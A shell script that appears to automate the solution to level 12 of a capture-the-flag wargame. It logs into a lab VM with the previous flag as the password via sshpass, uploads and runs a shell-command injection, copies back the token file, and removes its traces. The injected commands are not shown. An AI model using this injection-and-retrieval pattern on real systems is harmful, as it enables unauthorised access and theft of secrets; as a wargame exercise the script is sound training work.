#!/bin/sh -eu

PREVIOUS_FLAG=../../level11/flag
ADDRESS=192.168.122.214
PORT=4242
INJECTION_FILE=INJECTED_SHELL_COMMANDS
INJECTION_FILE_LOCATION=/tmp
TOKEN=/tmp/token
FLAG=../flag

# Copy the `INJECTED_SHELL_COMMANDS` file to the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} -p ${INJECTION_FILE} level12@${ADDRESS}:${INJECTION_FILE_LOCATION}/${INJECTION_FILE}

# Execute the script to inject the shell commands on the virtual machine
sshpass -f ${PREVIOUS_FLAG} <inject_shell_commands.sh >/dev/null 2>&1 \
	ssh -p ${PORT} level12@${ADDRESS} \
		sh -s

# Copy the token from the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	scp -P ${PORT} level12@${ADDRESS}:${TOKEN} ${FLAG}

# Clean the virtual machine
sshpass -f ${PREVIOUS_FLAG} 2>/dev/null \
	ssh -p ${PORT} level12@${ADDRESS} \
		rm -f ${INJECTION_FILE_LOCATION}/${INJECTION_FILE} ${TOKEN}
